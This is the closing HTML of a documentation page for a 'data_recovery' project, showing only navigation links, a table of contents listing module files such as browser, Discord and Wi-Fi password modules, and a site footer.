</ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/projects/data_recovery/build"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Build</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/projects/data_recovery/usage"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Usage</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_jeP5 thin-scrollbar theme-doc-toc-desktop" style="opacity:0;transform:translateX(100px) translateZ(0)"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#config-directory" class="table-of-contents__link toc-highlight"><code>./config</code> directory</a><ul><li><a href="#configcolorspy" class="table-of-contents__link toc-highlight"><code>./config/colors.py</code></a></li><li><a href="#configconstantspy" class="table-of-contents__link toc-highlight"><code>./config/constants.py</code></a></li><li><a href="#configmanagerpy" class="table-of-contents__link toc-highlight"><code>./config/manager.py</code></a></li></ul></li><li><a href="#modules-directory" class="table-of-contents__link toc-highlight"><code>./modules</code> directory</a><ul><li><a href="#modulesapplicationsdiscordpy" class="table-of-contents__link toc-highlight"><code>./modules/applications/discord.py</code></a></li><li><a href="#modulesapplicationszippy" class="table-of-contents__link toc-highlight"><code>./modules/applications/zip.py</code></a></li><li><a href="#modulesbrowsersbookmarkspy" class="table-of-contents__link toc-highlight"><code>./modules/browsers/bookmarks.py</code></a></li><li><a href="#modulesbrowsershistorypy" class="table-of-contents__link toc-highlight"><code>./modules/browsers/history.py</code></a></li><li><a href="#modulesbrowserschromiumpy" class="table-of-contents__link toc-highlight"><code>./modules/browsers/chromium.py</code></a><ul><li><a href="#query-1-how-does-it-work-im-pretty-technical-so-give-me-the-inner-workings--main-functionality-of-how-everything-works-code" class="table-of-contents__link toc-highlight">Query 1: how does it work? im pretty technical, so give me the inner workings / main functionality of how everything works: [code]</a></li><li><a href="#result-1" class="table-of-contents__link toc-highlight">Result 1:</a></li><li><a href="#query-2-tell-me-everything-in-detail-about-3-information-extraction" class="table-of-contents__link toc-highlight">Query 2: tell me everything in detail, about 3. Information Extraction</a></li><li><a href="#result-1-1" class="table-of-contents__link toc-highlight">Result 1:</a></li></ul></li><li><a href="#modulesnetworknetworkpy" class="table-of-contents__link toc-highlight"><code>./modules/network/network.py</code></a></li><li><a href="#modulesnetworkwifi_passwordspy" class="table-of-contents__link toc-highlight"><code>./modules/network/wifi_passwords.py</code></a></li><li><a href="#modulessysteminfosystempy" class="table-of-contents__link toc-highlight"><code>./modules/systeminfo/system.py</code></a></li></ul></li></ul><hr class="hr_UhE0"><span class="percent_H6RK">0%<!-- --> </span></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Main Sections</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a class="footer__link-item" href="/blog/archive">Archive</a></li><li class="footer__item"><a class="footer__link-item" href="/docs/study/">Study</a></li><li class="footer__item"><a class="footer__link-item" href="/project">Projects</a></li><li class="footer__item"><a class="footer__link-item" href="/docs/projects/">Documentation</a></li></ul></div><div class="col footer__col"><div class="footer__title">Other Sections</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/study/">Linux</a></li><li class="footer__item"><a class="footer__link-item" href="/docs/windows/">Windows</a></li><li class="footer__item"><a class="footer__link-item" href="/docs/tutorials/">Tutorials</a></li></ul></div><div class="col footer__col"><div class="footer__title">Social Media</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/about">About</a></li><li class="footer__item"><a href="https://github.com/hirusha-adi" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_eQR1"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://twitter.com/hirushaadi" target="_blank" rel="noopener noreferrer" class="footer__link-item">Twitter<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_eQR1"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://photos.hirusha.xyz/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Photos</a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" position="right" href="/recommended-tools">Recommended Tools</a></li><li class="footer__item"><a class="footer__link-item" position="right" href="/contributions">Contributions</a></li><li class="footer__item"><a href="https://github.com/kuizuo/blog" target="_blank" rel="noopener noreferrer" class="footer__link-item" position="right">Theme by 愧怍</a></li><li class="footer__item">
                <a href="https://docusaurus.io/" target="_blank" rel="noreferrer noopener">
                  <img src="/img/buildwith.png" alt="build with docusaurus" width="120" height="50">
                <a>
                </a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">
        <p>Copyright © 2023-2024 Hirusha Adikari</p>
        </div></div></div></footer></div>
</body>
</html>